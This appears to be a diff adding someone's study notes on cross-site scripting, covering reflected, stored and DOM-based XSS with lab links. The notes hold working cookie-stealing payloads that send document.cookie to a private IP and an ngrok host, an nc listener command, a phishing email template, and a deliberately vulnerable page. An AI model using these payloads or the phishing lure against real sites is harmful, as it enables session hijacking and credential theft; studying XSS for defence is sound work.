@@ -1,0 +1,233 @@
+Cross-site Scripting Attacks:
+`````````````````````````````
+- Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. 
+
+
+
+
+
+
+
+
+
+- This vulnerability makes it possible for attackers to inject malicious code (e.g. JavaScript programs) into victim's web browser.
+
+
+
+
+
+
+
+
+- Using this malicious code, attackers can steal a victim’s credentials, such as session cookies.
+
+
+
+
+
+<></>
+++++++++++
+=>  Injection attack: XSS an attack resulting from an input validation failure that permits code to be input ... this unexpected code is then executed.
+
+=> Cookies: information stored in a browser and sent to a server with each resource request. A typical use is sending authentication credentials to the server.
+++++++++++
+
+
+
+<	
+>
+<>
+</>
+/>
+
+Why is XSS Possible?:
+`````````````````````
+- Absence of escape characters where they should be and turn code into plain text, for example, in search requests.
+
+- The absence of filtering of attributes and their values in allowed tags
+
++++++++++++
+Impact:
+-------
+> Cookie Theft [Session Hijack]
+> Keylogging	
+> Phishing
+> URL Redirection ...
+_____________________
+Types:
+------
+> rXSS		[ Reflected XSS ]
+
++ Reflected cross-site scripting is also known as Non-persistent cross-scripting. 
+
++ It is a cross-scripting attack where target servers reflect a malicious script.
+ 
++ The attacker can include the payload into an error page, a search result, or the target server’s response to some request.
+
+
+rXSS lab:
+`````````
+https://xss1.lab.hackintheclass.org
+
+https://xss2.lab.hackintheclass.org
+
+
+
+- a search form field that allows users to search
+- enters the following search string to test out the issue search feature: xxx
+- The search may returns no results that match the input string.
+- However, the application echoes back the search term xxx in the response.
+- Use the payload: <script>alert('hacked')</script>
+- However, a demonstration showing a JavaScript alert message doesn’t seem like much of a threat.
+- To fully understand and demonstrate the impact of a Cross-Site Scripting vulnerability
+- Evil Mail:
+_____________________
+Title: Security Issue
+From: natasha
+Subject: Security Issue
+Hi Alice, 
+
+I took a first pass at testing the latest release and found something interesting in the search feature. 
+
+It's best you take a look at it for yourself, 
+
+Regards,
+Natasha
+
+https://www.target.com/bob/blender/issues?query=<script>document.location = 'www.evil.com';</script>
+--------------------
+
+
+
+
+- Credential Theft: Success! Upon submitting her credentials to the fake login page, Alice's username and password are now logged on natasha's Apache webserver!
+
+
+
+
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+> sXSS		[ Stored XSS ]
+
++ Stored cross-site scripting is also known as Persistent cross-site scripting.
+
++ It is an attack where the hacker stores the malicious script/code on the targeted servers. 
+
++ The attacker usually tries to store the payload in the server’s persistent storage in some way.
+
+
++ When a user requests the data, the server delivers legit data mixed with the malicious script, making every application’s user a potential victim of this sXSS attack.
+
+
+
+
+
+
+
+payload:
+`````````
+<script>
+var img = document.createElement("img");
+img.src="http://192.168.40.99" + "/cookie=" + encodeURIComponent(document.cookie);
+document.body.appendChild(img);
+</script>
+
+nc -lvkp 80
+
+
+<img src="http://attacker'sIP/cookie=+++++++" />
+
+
+
+
+
+Payload:
+<script>new Image().src="https://15fc-152-57-199-156.in.ngrok.io/?cookie=" + document.cookie;</script>
+
+
+
+
+https://gochanakya.com/chanakya-details/Munna-MBBS-1509
+
+
+
+
+
+
+
+> DOM-XSS 	[ JavaScript ]
+
+
+
+
+
+
+
+
+______________________________________________________
+- For the DOM-based XSS to take place, the JavaScript code of the web app takes input from a source that is controllable by the attacker, such as the URL in the browser’s tab.
+
+
+
+
+
+
+
+
+
+
+- Unless adequate escaping or validation is performed for URL parameters, passing user-supplied input back into a javascript or other web components is a common source of DOM Cross-Site Scripting (XSS) attacks.
+
+
+
+
+
+
+
+NOTE: HTML DOM is a standard for how to add, update, delete or get HTML elements.
+
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <title>My Page</title>
+ </head>
+ <body>
+   <h1>page</h1>
+ </body>
+</html>
+
+1. host on web server
+2. Open chrome & visit:http://192.168.1.111/1.html
+3. Open Devloper tools console
+4. run: > document
+________________
+NOTE: If you will use JavaScript to modify HTML 
+________________
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <title>My Page</title>
+  <script>
+	const queryString = location.search; // Extract the queryString from the URL
+	const urlParams = new URLSearchParams(queryString); // parse the queryString
+	const name = urlParams.get('name')
+	document.write('<h1> Hello, ' + name + '!</h1>');
+</script>
+ </head>
+<body>
+  <div>
+   <h1>DOMed page</h1>
+ </body>
+<html>
+
+Visit:
+``````
+http://192.168.1.111/1.html?name=Dheeraj
+
+Hello Dheeraj
+
+Payload:
+````````
+http://192.168.1.111/1.html?name=<script>alert(1)</script>
